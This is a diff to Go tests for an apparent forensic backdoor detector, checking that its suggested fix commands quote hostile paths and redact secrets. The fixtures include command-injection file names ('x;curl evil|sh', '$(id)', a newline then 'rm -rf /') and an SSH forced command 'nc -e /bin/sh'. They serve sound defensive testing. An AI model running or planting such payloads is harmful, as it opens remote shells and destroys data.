@@ -101,7 +101,7 @@ func TestHeuristicSecondUID0(t *testing.T) {
 
 func TestHeuristicEmptyPassword(t *testing.T) {
 	c := cleanCollection()
-	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "bob", UID: 1001, Shell: "/bin/bash"})
+	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "bob", UID: 1001, Shell: "/bin/bash", Password: model.PasswordState{Known: true}})
 	want(t, c, "heur.empty_password:bob", model.SevWeak)
 }
 
@@ -115,7 +115,7 @@ func TestHeuristicLDPreload(t *testing.T) {
 	c := cleanCollection()
 	c.Persist[0].Lines = []string{"/tmp/evil.so"}
 	f := want(t, c, "heur.ld_preload", model.SevBackdoor)
-	if !strings.Contains(f.Fix, "cp -a /etc/ld.so.preload /root/telltale-evidence/") || strings.Index(f.Fix, "cp -a") > strings.Index(f.Fix, "rm ") {
+	if !strings.Contains(f.Fix, "cp -a --parents '/etc/ld.so.preload' /root/telltale-evidence/") || strings.Index(f.Fix, "cp -a") > strings.Index(f.Fix, "rm ") {
 		t.Errorf("fix: %s", f.Fix)
 	}
 }
@@ -190,7 +190,7 @@ func TestHeuristicImmutableFlag(t *testing.T) {
 		model.FileEntry{Path: "/etc/y", Type: "file", Flags: 0x20},
 		model.FileEntry{Path: "/etc/z", Type: "file", Flags: 0x80})
 	f := want(t, c, "heur.immutable:/etc/cron.d/x", model.SevBackdoor)
-	if !strings.Contains(f.Fix, "chattr -i /etc/cron.d/x") {
+	if !strings.Contains(f.Fix, "chattr -i '/etc/cron.d/x'") {
 		t.Errorf("fix: %s", f.Fix)
 	}
 	want(t, c, "heur.immutable:/etc/y", model.SevBackdoor)
@@ -246,4 +246,75 @@ func TestHeuristicPersistLink(t *testing.T) {
 	if find(fs, "heur.persist_link:/etc/systemd/system/ok.service") != nil || find(fs, "heur.persist_link:/etc/systemd/system/other.service") != nil {
 		t.Errorf("benign links flagged: %v", keys(fs))
 	}
+}
+
+func TestHeuristicEmptyPasswordUnknownNotFlagged(t *testing.T) {
+	c := cleanCollection()
+	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "carl", UID: 1002, Shell: "/bin/bash"})
+	if fs := Run(c, ctx, cleanOwned()); len(fs) != 0 {
+		t.Fatalf("unknown state flagged: %v", keys(fs))
+	}
+}
+
+func TestFixQuotesHostileNames(t *testing.T) {
+	for _, name := range []string{"/usr/bin/x;curl evil|sh", "/usr/bin/$(id)", "/usr/bin/`id`", "/usr/bin/it's"} {
+		c := cleanCollection()
+		c.Files = append(c.Files, model.FileEntry{Path: name, Type: "file", Mode: 0o104755})
+		f := want(t, c, "heur.unowned_setuid:"+name, model.SevBackdoor)
+		if !strings.Contains(f.Fix, sq(name)) {
+			t.Errorf("%q not quoted in %s", name, f.Fix)
+		}
+		if strings.Contains(name, "'") && !strings.Contains(f.Fix, `'\''`) {
+			t.Errorf("quote not escaped: %s", f.Fix)
+		}
+	}
+	c := cleanCollection()
+	bad := "/usr/bin/x\nrm -rf /"
+	c.Files = append(c.Files, model.FileEntry{Path: bad, Type: "file", Mode: 0o104755})
+	f := want(t, c, "heur.unowned_setuid:"+bad, model.SevBackdoor)
+	if strings.Contains(f.Fix, "rm -rf") || strings.Contains(f.Fix, "\n") || !strings.Contains(f.Fix, "control characters") {
+		t.Errorf("fix = %q", f.Fix)
+	}
+	c = cleanCollection()
+	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "a;b", UID: 0, Shell: "/bin/sh", Password: model.PasswordState{Set: true}})
+	f = want(t, c, "heur.uid0:a;b", model.SevBackdoor)
+	if !strings.Contains(f.Fix, "userdel 'a;b'") {
+		t.Errorf("fix = %q", f.Fix)
+	}
+}
+
+func TestHeuristicEscapedQuoteCommand(t *testing.T) {
+	c := cleanCollection()
+	c.Persist[1].Lines = []string{`from="a\"",command="nc -e /bin/sh" ssh-rsa AAAAB3other x`}
+	f := want(t, c, "heur.forced_command:/root/.ssh/authorized_keys:1", model.SevBackdoor)
+	if !strings.Contains(f.Fix, "highest line number") || !strings.Contains(f.Fix, "--parents") {
+		t.Errorf("fix = %s", f.Fix)
+	}
+	c.Persist[1].Lines = []string{`from="a,b" ssh-rsa AAAAB3other x`}
+	if find(Run(c, ctx, cleanOwned()), "heur.forced_command:/root/.ssh/authorized_keys:1") != nil {
+		t.Error("normal from= flagged as command")
+	}
+}
+
+func TestHeuristicCmdlineRedacted(t *testing.T) {
+	c := cleanCollection()
+	c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: 8, UID: 0, Exe: "/tmp/m", Cmdline: "mysql --password=secret -h x"})
+	f := want(t, c, "heur.proc_exe:8", model.SevBackdoor)
+	if strings.Contains(f.Evidence[0].Detail, "secret") {
+		t.Errorf("leaked: %s", f.Evidence[0].Detail)
+	}
+}
+
+func TestHeuristicHiddenDirInOwnHome(t *testing.T) {
+	c := cleanCollection()
+	c.Runtime.Processes = append(c.Runtime.Processes,
+		model.Process{PID: 20, UID: 1000, Exe: "/home/alice/.cache/x/bin"},
+		model.Process{PID: 21, UID: 1000, Exe: "/home/bob/.cache/x/bin"},
+		model.Process{PID: 22, UID: 0, Exe: "/home/alice/.cache/x/bin"},
+		model.Process{PID: 23, UID: 1000, Exe: "/tmp/x"})
+	c.Accounts.Users[2].Home = "/home/alice"
+	want(t, c, "heur.proc_exe:20", model.SevNote)
+	want(t, c, "heur.proc_exe:21", model.SevBackdoor)
+	want(t, c, "heur.proc_exe:22", model.SevBackdoor)
+	want(t, c, "heur.proc_exe:23", model.SevBackdoor)
 }
